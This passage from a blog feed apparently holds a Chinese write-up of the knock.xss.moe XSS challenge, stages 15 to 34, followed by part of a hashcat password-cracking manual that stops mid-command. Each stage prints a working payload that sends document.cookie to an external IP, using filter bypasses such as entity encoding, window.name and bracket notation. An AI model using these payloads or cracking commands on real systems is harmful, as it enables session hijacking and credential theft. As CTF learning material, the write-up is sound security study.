class="headerlink" title="stage15"></a>stage15</h2><p>直接用svg就OK了<br>payload</p><pre><code>http://e3bcee011cad77ba066ca7c2ad2884372aec9566.knock.xss.moe/?q=%3Csvg/onload=document.location=`http://134.175.33.164:1234/?${document.cookie}`%3E</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209233017-9a38767a-2c7f-1.png" alt="image.png"></p><h2 id="stage16"><a href="#stage16" class="headerlink" title="stage16"></a>stage16</h2><p>16关是跳转到q参数所对应的网址<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209234736-05ca184c-2c82-1.png" alt="image.png"><br>很容易想到用JavaScript伪协议<br>payload</p><pre><code>http://86620d66a1b474c588ef787b711b0f1d8843a1af.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${parent.document.cookie}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209234712-f75bae24-2c81-1.png" alt="image.png"></p><h2 id="stage17"><a href="#stage17" class="headerlink" title="stage17"></a>stage17</h2><p>和stage16一样</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209235428-fb24f28a-2c82-1.png" alt="image.png"><br>payload</p><pre><code>http://34a131df991487bf58d3df0a85e247d396fb93a0.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${parent.document.cookie}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209235524-1c84d67a-2c83-1.png" alt="image.png"></p><h2 id="stage18"><a href="#stage18" class="headerlink" title="stage18"></a>stage18</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000233-1c2c77d6-2c84-1.png" alt="image.png"><br>尝试代码注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000303-2e3fd134-2c84-1.png" alt="image.png"><br>发现给单引号前面加了一个<code>\</code>，但是我们在单引号前面再加一个<code>\</code>吃掉它</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000505-77024604-2c84-1.png" alt="image.png"><br>最终payload</p><pre><code>http://c6a860d0948320766d5c4d8dc3bbdcdf9dd95884.knock.xss.moe/?q=1\');document.location=`http://134.175.33.164:1234/?${document.cookie}`;//</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000819-eaa83514-2c84-1.png" alt="image.png"></p><h2 id="stage19"><a href="#stage19" class="headerlink" title="stage19"></a>stage19</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210001114-5319455c-2c85-1.png" alt="image.png"><br>尝试代码注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210001131-5d036e76-2c85-1.png" alt="image.png"><br>但是我发现我用这个payload老是打不到cookie</p><pre><code>http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=XSS%27);window.open(`http://134.175.33.164:1234/?${document.cookie}`);//</code></pre><p>然后发现，必须要我把前面那个xss的弹窗点了之后后面的js代码才会触发，然而后台的bot并不会点击弹窗，所以才导致我们后面的代码不会执行，所以我们的利用点必须是在alert里面，尝试一波发现alert里面可以用其它函数，原因不明，有知道的师傅还请科普<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210122843-595e90fe-2cec-1.gif" alt=""><br>最终payload</p><pre><code>http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=XSS',window.open(`http://134.175.33.164:1234/?${document.cookie}`));//</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210123113-b29600e4-2cec-1.png" alt="image.png"></p><h2 id="stage20"><a href="#stage20" class="headerlink" title="stage20"></a>stage20</h2><p>发现script被替换为空，双写script即可绕过<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210010749-3a55d88e-2c8d-1.png" alt="image.png"><br>payload</p><pre><code>http://303f34eb0a974a432254a4cb2d6e07fa6f8b0b7f.knock.xss.moe/?q=&lt;scriscriptpt&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/scriscriptpt&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210010717-2788d396-2c8d-1.png" alt="image.png"></p><h2 id="stage21"><a href="#stage21" class="headerlink" title="stage21"></a>stage21</h2><p>和上一题差不多，只不过这题双写script没有用，但是我们可以用大小写绕过，但是发现无论怎么样都收不到cookie，查看一波响应头，发现<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210110523-b51fff10-2ce0-1.png" alt="image.png"></p><blockquote><p>X-XSS-Protection:1;mode=block,这里使用了XSS过滤，如果检测到攻击，就会浏览器会阻止页面渲染</p></blockquote><p>但是它会把script替换为空，所以我们可以利用script混淆代码，导致浏览器检测不出xss；<br>payload</p><pre><code>http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=&lt;Script&gt;docuscriptment.loscriptcation=`http://134.175.33.164:1234/?${document.cookie}`&lt;/sCript&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210124435-90e7f59a-2cee-1.png" alt="image.png"></p><h2 id="stage22"><a href="#stage22" class="headerlink" title="stage22"></a>stage22</h2><p>22关发现有长度限制<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210124627-d3aff0a8-2cee-1.png" alt="image.png"><br>发现最大长度是65<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210124716-f0ce5968-2cee-1.png" alt="image.png"><br>标签首先考虑用svg比较合适，然后用<code>//</code>代替<code>http://</code>，IP使用十进制ip<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174223-2ae0a1e6-2d18-1.png" alt="image.png"><br>刚好65个踩点，最后payload</p><pre><code>http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/?q=&lt;svg/onload=window.open(`//2259624356:1234/?${document.cookie}`)&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174143-12f61548-2d18-1.png" alt="image.png"></p><h2 id="stage23"><a href="#stage23" class="headerlink" title="stage23"></a>stage23</h2><p>这题限制55个字符<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174544-a299cfbe-2d18-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174606-afa4f792-2d18-1.png" alt="image.png"><br>我们可以使用<code>location.hash</code>，然后<code>&lt;svg/onload=eval(location.hash.slice(1))&gt;</code>，最后在<code>#</code>后面再加上我们的payload</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210202538-f9313e46-2d2e-1.png" alt="image.png"><br>长度41，没毛病</p><p>最终payload</p><pre><code>http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`http://134.175.33.164:1234/?${document.cookie}`)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210202037-461ad754-2d2e-1.png" alt="image.png"></p><h2 id="stage24"><a href="#stage24" class="headerlink" title="stage24"></a>stage24</h2><p>这关限制字符45，但是stage23的payload仍然能用</p><pre><code>http://1498f071159fd60222c0e7e82b7b6ff046e9e52e.knock.xss.moe/?q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`http://134.175.33.164:1234/?${document.cookie}`)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210202338-b172824a-2d2e-1.png" alt="image.png"></p><h2 id="stage25"><a href="#stage25" class="headerlink" title="stage25"></a>stage25</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210203148-d5abe3bc-2d2f-1.png" alt="image.png"><br>这关限制35个字符，这还让不让人活了。这题前前后后搞了一小时，弄得我头皮发麻，无奈查了很多Short XSS，功夫不负有心人，发现了一片新天地</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210212556-65bb09fe-2d37-1.png" alt="image.png"></p><p>既然后台的bot是直接加载我们提交的URL，那么我们尝试在我们vps上部署以下代码</p><pre><code>&lt;script&gt;window.name = "location.href=`http://134.175.33.164:1234/?${parent.document.cookie}`";location.href = "http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=&lt;svg/onload=eval(window.name)&gt;";&lt;/script&gt;</code></pre><p>然后把我的vps的链接直接提交过去</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210211800-4a1ad7c0-2d36-1.png" alt="image.png"><br>Getflag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210211550-fcc397aa-2d35-1.png" alt="image.png"></p><h2 id="stage26"><a href="#stage26" class="headerlink" title="stage26"></a>stage26</h2><p>这题回把我们payload全部转化为大写，但是js中的函数是区分大小写的，但是我们可以用HTML实体编码绕过，然后再urlencode，不然浏览器会把<code>#</code>后面当作描点<br>payload</p><pre><code>http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src="x" onerror=%26%23%78%37%37%3b%26%23%78%36%39%3b%26%23%78%36%65%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%37%37%3b%26%23%78%32%65%3b%26%23%78%36%66%3b%26%23%78%37%30%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%32%38%3b%26%23%78%36%30%3b%26%23%78%36%38%3b%26%23%78%37%34%3b%26%23%78%37%34%3b%26%23%78%37%30%3b%26%23%78%33%61%3b%26%23%78%32%66%3b%26%23%78%32%66%3b%26%23%78%33%31%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%37%3b%26%23%78%33%35%3b%26%23%78%32%65%3b%26%23%78%33%33%3b%26%23%78%33%33%3b%26%23%78%32%65%3b%26%23%78%33%31%3b%26%23%78%33%36%3b%26%23%78%33%34%3b%26%23%78%33%61%3b%26%23%78%33%31%3b%26%23%78%33%32%3b%26%23%78%33%33%3b%26%23%78%33%34%3b%26%23%78%32%66%3b%26%23%78%33%66%3b%26%23%78%32%34%3b%26%23%78%37%62%3b%26%23%78%36%34%3b%26%23%78%36%66%3b%26%23%78%36%33%3b%26%23%78%37%35%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%36%65%3b%26%23%78%37%34%3b%26%23%78%32%65%3b%26%23%78%36%33%3b%26%23%78%36%66%3b%26%23%78%36%66%3b%26%23%78%36%62%3b%26%23%78%36%39%3b%26%23%78%36%35%3b%26%23%78%37%64%3b%26%23%78%36%30%3b%26%23%78%32%39%3b&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210215045-dd653ed6-2d3a-1.png" alt="image.png"></p><h2 id="stage27"><a href="#stage27" class="headerlink" title="stage27"></a>stage27</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210215158-08e6eba4-2d3b-1.png" alt="image.png"><br>这题把<code>.</code>给过滤了，但是我们可以用数组的形式表示：window[‘open’],document[‘cookie’]，<br>URL中的点的话，我们有两种方法，第一种方法是把ip地址转化为十进制ip地址，第二种方法是把url中的<code>.</code>换成中文的句号，浏览器会把中文的句号自动转化成<code>.</code><br>payload：</p><pre><code>第一种:http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/?q=&lt;script&gt;window['open'](`http://134。175。33。164:1234/?${document['cookie']}`)&lt;/script&gt;第二种：http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/?q=&lt;script&gt;window['open'](`http://2259624356:1234/?${document['cookie']}`)&lt;/script&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210215951-22957880-2d3c-1.png" alt="image.png"></p><h2 id="stage28"><a href="#stage28" class="headerlink" title="stage28"></a>stage28</h2><p>这题比上一题多了一个过滤了双引号和单引号，但是我们可以用反引号绕过<br>payload</p><pre><code>http://02f6f47ddaa7b22137a74843f2c4f1ac915dda3b.knock.xss.moe/?q=&lt;script&gt;window[`open`](`http://2259624356:1234/?${document[`cookie`]}`)&lt;/script&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210220350-b1300fa6-2d3c-1.png" alt="image.png"></p><h2 id="stage29"><a href="#stage29" class="headerlink" title="stage29"></a>stage29</h2><p>这题过滤了括号和<code>.</code>，用<code>document['location']</code>就ok了<br>payload</p><pre><code>http://a4bf8393a4159b94aa4b84e9a134d5e6140f3c34.knock.xss.moe/?q=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210220954-89dc8da2-2d3d-1.png" alt="image.png"></p><h2 id="stage30"><a href="#stage30" class="headerlink" title="stage30"></a>stage30</h2><p>和上一题一毛一样</p><pre><code>http://ebf510ac2d79576cd5b7d45412eaf3eed1781bd0.knock.xss.moe/?q=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210221233-e89eabfe-2d3d-1.png" alt="image.png"></p><h2 id="stage31-34-这四题一毛一样"><a href="#stage31-34-这四题一毛一样" class="headerlink" title="stage31-34(这四题一毛一样)"></a>stage31-34(这四题一毛一样)</h2><p>这题过滤了<code>&gt;</code>，但是没有过滤掉<code>&lt;</code>，但是<code>&lt;svg/onload=alert(1)</code>不需要闭合尖括号也可以执行</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210221455-3d7f3a8a-2d3e-1.png" alt="image.png"><br>payload</p><pre><code>http://bb84607f02113a22396438c9a67e4c5abdfd6561.knock.xss.moe/?q=%3Csvg/onload=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`//%3E</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210222509-abab400c-2d3f-1.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然这些题目并不是很难，但是套路还是很多的，学到了不少东西</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hashcat的使用手册总结</title>
      <link href="/2019/02/13/Hashcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%E6%80%BB%E7%BB%93/"/>
      <url>/2019/02/13/Hashcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4008" target="_blank" rel="noopener">https://xz.aliyun.com/t/4008</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Hashcat</code>是自称世界上最快的密码恢复工具。它在2015年之前拥有专有代码库，但现在作为免费软件发布。适用于Linux，OS X和Windows的版本可以使用基于CPU或基于GPU的变体。支持<code>hashcat</code>的散列算法有<code>Microsoft LM哈希，MD4，MD5，SHA</code>系列，Unix加密格式，MySQL和Cisco PIX等。</p><p>hashcat支持多种计算核心：</p><pre><code>GPUCPUAPUDSPFPGACoprocessor</code></pre><p>GPU的驱动要求</p><pre><code>AMD GPUs on Linux require "RadeonOpenCompute (ROCm)" Software Platform (1.6.180 or later)AMD GPUs on Windows require "AMD Radeon Software Crimson Edition" (15.12 or later)Intel CPUs require "OpenCL Runtime for Intel Core and Intel Xeon Processors" (16.1.1 or later)Intel GPUs on Linux require "OpenCL 2.0 GPU Driver Package for Linux" (2.0 or later)Intel GPUs on Windows require "OpenCL Driver for Intel Iris and Intel HD Graphics"NVIDIA GPUs require "NVIDIA Driver" (367.x or later)</code></pre><p>最新版hashcat下载地址：<a href="http://https://hashcat.net/files/hashcat-5.1.0.7z" title="https://hashcat.net/files/hashcat-5.1.0.7z" target="_blank" rel="noopener">https://hashcat.net/files/hashcat-5.1.0.7z</a><br>GitHub地址：<a href="https://github.com/hashcat/hashcat" title="https://github.com/hashcat/hashcat" target="_blank" rel="noopener">https://github.com/hashcat/hashcat</a></p><h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><p>下面使常见的参数，想了解更多的参数可以hashcat –help查看</p><pre><code>-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。-m  指定要破解的hash类型，如果不指定类型，则默认是MD5-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中--force    忽略破解过程中的警告信息,跑单条hash可能需要加上此选项--show    显示已经破解的hash及该hash所对应的明文--increment     启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用--increment-max  密码最大长度,同上--outfile-format 指定破解结果的输出格式id,默认是3--username      忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到--remove      删除已被破解成功的hash-r         使用自定义破解规则</code></pre><h2 id="攻击模式："><a href="#攻击模式：" class="headerlink" title="攻击模式："></a>攻击模式：</h2><pre><code>  # | Mode ===+======  0 | Straight（字段破解）  1 | Combination（组合破解）  3 | Brute-force（掩码暴力破解）  6 | Hybrid Wordlist + Mask（字典+掩码破解）  7 | Hybrid Mask + Wordlist（掩码+字典破解）</code></pre><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><pre><code>1 = hash[:salt]2 = plain3 = hash[:salt]:plain4 = hex_plain5 = hash[:salt]:hex_plain6 = plain:hex_plain7 = hash[:salt]:plain:hex_plain8 = crackpos9 = hash[:salt]:crackpos10 = plain:crackpos11 = hash[:salt]:plain:crackpos12 = hex_plain:crackpos13 = hash[:salt]:hex_plain:crackpos14 = plain:hex_plain:crackpos15 = hash[:salt]:plain:hex_plain:crackpos</code></pre><h2 id="Hash-id对照表"><a href="#Hash-id对照表" class="headerlink" title="Hash id对照表"></a>Hash id对照表</h2><p>因为实在是太多了，所有我就贴一部分常见的hash类型，要想了解所有的参数可到hashcat的<a href="https://hashcat.net/wiki/doku.php?id=hashcat" title="Wiki" target="_blank" rel="noopener">Wiki</a>上去看，或者直接hashcat –help查看hash对照表</p><pre><code>- [ Hash modes ] -      # | Name                                             | Category  ======+==================================================+======================================    900 | MD4                                              | Raw Hash      0 | MD5                                              | Raw Hash   5100 | Half MD5                                         | Raw Hash    100 | SHA1                                             | Raw Hash   1300 | SHA2-224                                         | Raw Hash   1400 | SHA2-256                                         | Raw Hash  10800 | SHA2-384                                         | Raw Hash   1700 | SHA2-512                                         | Raw Hash  17300 | SHA3-224                                         | Raw Hash  17400 | SHA3-256                                         | Raw Hash  17500 | SHA3-384                                         | Raw Hash  17600 | SHA3-512                                         | Raw Hash     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated     30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and/or Iterated     40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and/or Iterated   3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and/or Iterated   3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and/or Iterated   4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and/or Iterated   4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated   2600 | md5(md5($pass))                                  | Raw Hash, Salted and/or Iterated   3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated   4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and/or Iterated   4400 | md5(sha1($pass))                                 | Raw Hash, Salted and/or Iterated    110 | sha1($pass.$salt)                                | Raw Hash, Salted and/or Iterated    120 | sha1($salt.$pass)                                | Raw Hash, Salted and/or Iterated    130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and/or Iterated    140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and/or Iterated   4500 | sha1(sha1($pass))                                | Raw Hash, Salted and/or Iterated   4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and/or Iterated   4700 | sha1(md5($pass))                                 | Raw Hash, Salted and/or Iterated   4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and/or Iterated  14400 | sha1(CX)                                         | Raw Hash, Salted and/or Iterated   1410 | sha256($pass.$salt)                              | Raw Hash, Salted and/or Iterated   1420 | sha256($salt.$pass)                              | Raw Hash, Salted and/or Iterated   1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated   1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated   1710 | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated   1720 | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated   1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated   1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated  14000 | DES (PT = $salt, key = $pass)                    | Raw Cipher, Known-Plaintext attack  14100 | 3DES (PT = $salt, key = $pass)                   | Raw Cipher, Known-Plaintext attack  14900 | Skip32 (PT = $salt, key = $pass)                 | Raw Cipher, Known-Plaintext attack  15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols   2501 | WPA-EAPOL-PMK                                    | Network Protocols  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols  16801 | WPA-PMKID-PMK                                    | Network Protocols   7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols   8300 | DNSSEC (NSEC3)                                   | Network Protocols  10200 | CRAM-MD5                                         | Network Protocols  11100 | PostgreSQL CRAM (MD5)                            | Network Protocols  11200 | MySQL CRAM (SHA1)                                | Network Protocols  16100 | TACACS+                                          | Network Protocols  16500 | JWT (JSON Web Token)                             | Network Protocols    121 | SMF (Simple Machines Forum) &gt; v1.1               | Forums, CMS, E-Commerce, Frameworks    400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks   2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks   2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks   8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks     11 | Joomla &lt; 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks    400 | Joomla &gt;= 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks    400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks   2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks   7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks     21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks     21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks  11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks    124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks  10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks     12 | PostgreSQL                                       | Database Server    131 | MSSQL (2000)                                     | Database Server    132 | MSSQL (2005)                                     | Database Server   1731 | MSSQL (2012, 2014)                               | Database Server    200 | MySQL323                                         | Database Server    300 | MySQL4.1/MySQL5                                  | Database Server   3100 | Oracle H: Type (Oracle 7+)                       | Database Server    112 | Oracle S: Type (Oracle 11+)                      | Database Server  12300 | Oracle T: Type (Oracle 12+)                      | Database Server   8000 | Sybase ASE                                       | Database Server  15000 | FileZilla Server &gt;= 0.9.55                       | FTP Server  11500 | CRC32                                            | Checksums   3000 | LM                                               | Operating Systems   1000 | NTLM                                             | Operating Systems    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems    122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems   1722 | macOS v10.7                                      | Operating Systems   7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems  11600 | 7-Zip                                            | Archives  12500 | RAR3-hp                                          | Archives  13000 | RAR5                                             | Archives  13600 | WinZip                                           | Archives   9700 | MS Office &lt;= 2003 $0/$1, MD5 + RC4               | Documents   9710 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1  | Documents   9720 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2  | Documents   9800 | MS Office &lt;= 2003 $3/$4, SHA1 + RC4              | Documents   9810 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1    | Documents   9820 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2    | Documents   9400 | MS Office 2007                                   | Documents   9500 | MS Office 2010                                   | Documents   9600 | MS Office 2013                                   | Documents  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents  10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents  99999 | Plaintext                                        | Plaintext</code></pre><h2 id="掩码设置"><a href="#掩码设置" class="headerlink" title="掩码设置"></a>掩码设置</h2><p>这里列一下常见的掩码字符集</p><pre><code>l | abcdefghijklmnopqrstuvwxyz            纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ            纯大写字母d | 0123456789                    纯数字h | 0123456789abcdef                常见小写子目录和数字H | 0123456789ABCDEF                常见大写字母和数字s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~        特殊字符a | ?l?u?d?s                    键盘上所有可见的字符b | 0x00 - 0xff                    可能是用来匹配像空格这种密码的</code></pre><p>下面举几个简单的例子来了解一下掩码的设置</p><pre><code>八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</code></pre><p>如果我们想设置字符集为：<code>abcd123456!@-+</code>，那该怎么做呢。这就需要用到自定义字符集这个参数了，hashcat支持用户最多定义4组字符集</p><pre><code>--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4在掩码中用?1、?2、?3、?4来表示。</code></pre><p>再来举几个例子：</p><pre><code>--custom-charset1 abcd123456!@-+。然后我们就可以用"?1"去表示这个字符集了--custom-charset2 ?l?d，这里和?2就等价于?h-1 ?d?l?u，?1就表示数字+小写字母+大写字母-3 abcdef -4 123456 那么?3?3?3?3?4?4?4?4就表示为前四位可能是“abcdef”，后四位可能是“123456”</code></pre><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>PS：我这里给一下我机子的配置，然后再对比一下破解的速度</p><pre><code>CPU：Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz显卡：GTX 1050 Ti</code></pre><h2 id="7位数字破解"><a href="#7位数字破解" class="headerlink" title="7位数字破解"></a>7位数字破解</h2><pre><code>hashcat64.exe -a 3 -m 0 --force 25c3e88f81b4853f2a8faacad4c871b6 ?d?d?d?d?d?d?d</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190128211124-36baa378-22fe-1.png" alt="image.png"></p><h2 id="7位小写字母破解："><a href="#7位小写字母破解：" class="headerlink" title="7位小写字母破解："></a>7位小写字母破解：</h2><pre><code>hashcat64.exe -a 3 -m 0 --force 7a47c6db227df60a6d67245d7d8063f3 ?l?l?l?l?l?l?l</code></pre><h2 id="1-8位数字破解："><a href="#1-8位数字破解：" class="headerlink" title="1-8位数字破解："></a>1-8位数字破解：</h2><pre><code>hashcat64.exe -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d</code></pre><h2 id="1-8位小写字母-数字破解"><a href="#1-8位小写字母-数字破解" class="headerlink" title="1-8位小写字母+数字破解"></a>1-8位小写字母+数字破解</h2><pre><code>hashcat64.exe -a 3 -m 0 --force ab65d749cba1656ca11dfa1cc2383102 --increment --increment-min 1 --increment-max 8 ?h?h?h?h?h?h?h?h</code></pre><h2 id="特定字符集：123456abcdf"><a href="#特定字符集：123456abcdf" class="headerlink" title="特定字符集：123456abcdf!@+-"></a>特定字符集：123456abcdf!@+-</h2><pre><code>hashcat64.exe -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1注意一下：这里的-1和?1是数字1，不是字母l</code></pre><h2 id="1-8为位符集-123456abcdf"><a href="#1-8为位符集-123456abcdf" class="headerlink" title="1-8为位符集:123456abcdf!@+-"></a>1-8为位符集:123456abcdf!@+-</h2><pre><code>hashcat64.exe -a 3 -1 123456abcdf!@+- 9054fa315ce16f7f0955b4af06d1aa1b --increment --increment-min 1 --increment-max 8 